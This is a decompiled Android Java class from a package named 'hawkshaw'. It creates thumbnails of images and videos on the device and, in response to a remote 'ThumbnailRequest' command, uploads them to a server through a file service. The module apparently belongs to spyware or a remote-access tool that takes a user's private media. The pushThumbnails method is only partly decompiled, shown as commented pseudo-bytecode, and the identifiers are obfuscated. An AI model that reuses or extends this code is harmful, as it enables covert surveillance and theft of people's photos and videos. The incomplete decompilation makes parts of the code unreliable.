package com.hawkshaw.library.features.media.filecrud;

import O1.m;
import O1.p;
import O1.t;
import W2.e;
import W2.l;
import X1.B;
import Y1.K;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ExifInterface;
import android.media.MediaMetadataRetriever;
import android.media.ThumbnailUtils;
import android.net.Uri;
import com.hawkshaw.library.App;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.List;
import q3.k;
import t3.N;

public final class ThumbnailsUtilsKt {
    private static final String TAG = "ThumbnailsUtils";
    private static final e stream$delegate = new l(t.f1553D);

    /* access modifiers changed from: private */
    public static final byte[] getImageThumbnail(File file) {
        ExifInterface exifInterface;
        Bitmap bitmap;
        try {
            exifInterface = new ExifInterface(file.getPath());
        } catch (Exception unused) {
            exifInterface = null;
        }
        if (exifInterface == null || !exifInterface.hasThumbnail()) {
            try {
                bitmap = ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(file.getPath()), 128, 128);
            } catch (Exception e5) {
                Logger.e$default(Logger.INSTANCE, TAG, C0528x.e("Image: ", file.getPath(), ", ", e5.getMessage()), (Exception) null, false, 12, (Object) null);
                bitmap = null;
            }
        } else {
            bitmap = exifInterface.getThumbnailBitmap();
        }
        if (bitmap != null) {
            return toByteArray(bitmap);
        }
        return null;
    }

    /* access modifiers changed from: private */
    public static final Object getMediaThumbnails(k kVar, a3.e eVar) {
        return B.B(N.f9290a, new p(kVar, (a3.e) null), eVar);
    }

    private static final ByteArrayOutputStream getStream() {
        return (ByteArrayOutputStream) stream$delegate.getValue();
    }

    /* access modifiers changed from: private */
    public static final byte[] getVideoThumbnail(File file) {
        Bitmap bitmap;
        MediaMetadataRetriever mediaMetadataRetriever = new MediaMetadataRetriever();
        try {
            mediaMetadataRetriever.setDataSource(App.Companion.getContext(), Uri.parse(file.getPath()));
            Bitmap frameAtTime = mediaMetadataRetriever.getFrameAtTime(1000, 2);
            if (frameAtTime != null) {
                bitmap = Bitmap.createScaledBitmap(frameAtTime, 128, 128, false);
                mediaMetadataRetriever.release();
                if (bitmap != null) {
                    return toByteArray(bitmap);
                }
                return null;
            }
            throw new Exception();
        } catch (Exception e5) {
            Logger.e$default(Logger.INSTANCE, TAG, "Video MMR: " + file.getPath() + ", " + e5.getMessage(), (Exception) null, false, 12, (Object) null);
            try {
                bitmap = ThumbnailUtils.createVideoThumbnail(file.getPath(), 1);
            } catch (Exception e6) {
                Logger.e$default(Logger.INSTANCE, TAG, "Video TU: " + file.getPath() + ", " + e6.getMessage(), (Exception) null, false, 12, (Object) null);
                bitmap = null;
            }
        } catch (Throwable th) {
            mediaMetadataRetriever.release();
            throw th;
        }
    }

    /* JADX WARNING: type inference failed for: r9v4, types: [java.lang.Object, j3.s] */
    /* JADX WARNING: type inference failed for: r0v2, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x003f  */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x008d A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x008e  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0023  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushThumbnails(com.hawkshaw.library.datalayer.models.Command.ThumbnailRequest r8, a3.e r9) {
        /*
            boolean r0 = r9 instanceof O1.q
            if (r0 == 0) goto L_0x0013
            r0 = r9
            O1.q r0 = (O1.q) r0
            int r1 = r0.f1545F
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1545F = r1
            goto L_0x0018
        L_0x0013:
            O1.q r0 = new O1.q
            r0.<init>(r9)
        L_0x0018:
            java.lang.Object r9 = r0.f1544E
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1545F
            r3 = 2
            r4 = 1
            r5 = 0
            if (r2 == 0) goto L_0x003f
            if (r2 == r4) goto L_0x0037
            if (r2 != r3) goto L_0x002f
            java.lang.Object r8 = r0.f1543D
            w3.b r8 = (w3.C1066b) r8
            Y1.C0110h.P(r9)
            goto L_0x008f
        L_0x002f:
            java.lang.IllegalStateException r8 = new java.lang.IllegalStateException
            java.lang.String r9 = "call to 'resume' before 'invoke' with coroutine"
            r8.<init>(r9)
            throw r8
        L_0x0037:
            java.lang.Object r8 = r0.f1543D
            j3.s r8 = (j3.s) r8
            Y1.C0110h.P(r9)
            goto L_0x007c
        L_0x003f:
            Y1.C0110h.P(r9)
            j3.s r9 = new j3.s
            r9.<init>()
            java.util.List r2 = r8.getList()
            if (r2 == 0) goto L_0x0057
            int r2 = r2.size()
            java.lang.Integer r6 = new java.lang.Integer
            r6.<init>(r2)
            goto L_0x0058
        L_0x0057:
            r6 = r5
        L_0x0058:
            r9.f7500D = r6
            O1.s r2 = new O1.s
            r2.<init>(r8, r9, r5)
            w3.e r8 = new w3.e
            r8.<init>((i3.p) r2)
            com.hawkshaw.library.datalayer.Injector$Companion r2 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r2 = r2.getInstance()
            com.hawkshaw.library.datalayer.network.service.FileService r2 = r2.getFileService()
            r0.f1543D = r9
            r0.f1545F = r4
            java.lang.Object r8 = r2.uploadThumbnails(r8, r0)
            if (r8 != r1) goto L_0x0079
            return r1
        L_0x0079:
            r7 = r9
            r9 = r8
            r8 = r7
        L_0x007c:
            w3.b r9 = (w3.C1066b) r9
            O1.r r2 = new O1.r
            r2.<init>(r8, r5)
            r0.f1543D = r9
            r0.f1545F = r3
            java.lang.Object r8 = v3.j.c(r0, r2, r9)
            if (r8 != r1) goto L_0x008e
            return r1
        L_0x008e:
            r8 = r9
        L_0x008f:
            return r8
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.filecrud.ThumbnailsUtilsKt.pushThumbnails(com.hawkshaw.library.datalayer.models.Command$ThumbnailRequest, a3.e):java.lang.Object");
    }

    private static final byte[] toByteArray(Bitmap bitmap) {
        getStream().reset();
        bitmap.compress(Bitmap.CompressFormat.PNG, 90, getStream());
        byte[] byteArray = getStream().toByteArray();
        K.m(byteArray, "toByteArray(...)");
        return byteArray;
    }

    /* access modifiers changed from: private */
    public static final Object getMediaThumbnails(List<String> list, a3.e eVar) {
        return B.B(N.f9292c, new m(list, (a3.e) null), eVar);
    }
}
